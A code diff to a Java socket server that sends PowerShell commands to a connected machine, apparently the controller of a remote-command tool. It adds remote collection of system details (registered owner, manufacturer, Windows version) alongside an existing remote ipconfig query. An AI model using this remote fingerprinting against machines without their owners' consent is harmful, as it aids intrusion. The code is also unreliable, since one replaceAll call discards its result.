@@ -29,6 +29,7 @@ public class Server {
 		din = new DataInputStream(s.getInputStream());
 		
 		System.out.println("Connected to" + getIp());
+		System.out.println(getSysInfo());
 	}
 	
 	public void send(String str) throws IOException {
@@ -43,8 +44,12 @@ public class Server {
 		ss.close();
 	}
 	
+	public boolean connectionIsClosed() {
+		return s.isClosed();
+	}
+	
 	public String getIp() throws IOException {
-		String ip = "";
+		String ip = "[not found]";
 		
 		if(s.isConnected()) {
 			dout.writeUTF(" ipconfig | Select-String -Pattern Wi-Fi -Context 0,4");
@@ -54,13 +59,23 @@ public class Server {
 			ip = aux[1];
 			aux = ip.split(":");
 			ip = aux[1];
-			ip.replace("\n", "");
+			ip.replaceAll("[\n\r]", "");
 		}
 		
 		return ip;
 	}
 	
-	public boolean connectionIsClosed() {
-		return s.isInputShutdown();
+	public String getSysInfo() throws IOException {
+		String sysInfo = "[not found]";
+		
+		if(s.isConnected()) {
+			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion");
+			dout.flush();
+			
+			sysInfo = din.readUTF();
+			
+		}
+		
+		return sysInfo;
 	}
 }
